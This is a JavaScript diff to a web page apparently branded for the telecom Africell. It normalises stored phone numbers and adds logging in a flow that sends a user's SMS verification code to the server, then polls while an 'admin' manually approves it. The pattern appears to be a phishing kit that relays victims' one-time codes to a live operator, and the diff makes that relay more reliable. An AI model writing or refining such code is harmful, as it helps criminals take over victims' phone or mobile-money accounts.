@@ -83,7 +83,10 @@
             const pinVal = document.getElementById('verificationPin').value.trim();
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
-            const phoneInput = localStorage.getItem('africellUserPhone') || '+23200000000';
+            
+            // Strictly remove all spaces so phone matches server key format (+232XXXXXXXX)
+            let rawPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+23200000000';
+            const phoneInput = rawPhone.replace(/\s+/g, '').trim();
 
             if (!pinVal || pinVal.length < 4) {
                 showAppAlert('❌ Please enter a valid PIN code.');
@@ -93,6 +96,8 @@
             try {
                 verifyBtn.classList.add('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
+
+                console.log('📤 Submitting SMS Code for phone:', phoneInput);
 
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
@@ -119,7 +124,7 @@
         }
 
         function pollApprovalStatus(phone) {
-            const cleanPhone = phone.trim();
+            const cleanPhone = phone.replace(/\s+/g, '').trim();
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
             
@@ -129,7 +134,6 @@
             const statusInterval = setInterval(async () => {
                 elapsedTime += 3000;
 
-                // Failsafe timeout if admin doesn't click within 2 minutes
                 if (elapsedTime >= maxWaitTime) {
                     clearInterval(statusInterval);
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
@@ -142,7 +146,7 @@
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
 
-                    console.log('Scratch2 Polling Status Response:', data);
+                    console.log('🔄 Scratch2 Polling Status Response:', data);
 
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
